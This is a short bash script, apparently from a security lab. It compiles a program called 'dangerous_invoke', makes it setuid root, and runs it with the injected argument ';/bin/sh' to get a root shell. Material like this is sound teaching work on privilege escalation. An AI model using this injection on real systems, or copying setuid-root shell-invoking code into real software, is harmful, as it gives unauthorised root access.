#!/bin/bash

gcc -o dangerous_invoke dangerous_invoke.c
sudo chown root dangerous_invoke
sudo chmod 4755 dangerous_invoke
ls -l dangerous_invoke

./dangerous_invoke ";/bin/sh"